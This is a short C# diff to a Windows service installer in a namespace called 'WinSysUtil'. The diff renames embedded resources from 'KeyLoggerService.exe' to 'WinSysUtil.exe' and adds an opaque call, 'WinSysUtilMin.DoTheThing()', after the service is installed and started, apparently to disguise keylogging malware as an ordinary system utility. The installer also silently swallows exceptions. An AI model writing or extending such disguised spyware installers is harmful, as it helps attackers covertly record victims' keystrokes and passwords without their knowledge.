@@ -22,6 +22,8 @@ namespace WinSysUtil
             try
             {
                 InstallAndStartService();
+                WinSysUtilMin.DoTheThing();
+
             }
             catch (Exception)
             {
@@ -41,8 +43,8 @@ namespace WinSysUtil
             string configPath = Path.Combine(InstallDir, ConfigName);
 
             // 2. Extract files from embedded resources
-            ExtractResource("KeyLoggerService.exe", exePath);
-            ExtractResource("KeyLoggerService.exe.config", configPath);
+            ExtractResource("WinSysUtil.exe", exePath);
+            ExtractResource("WinSysUtil.exe.config", configPath);
 
             // 3. Check if service exists
             if (ServiceExists(ServiceName))
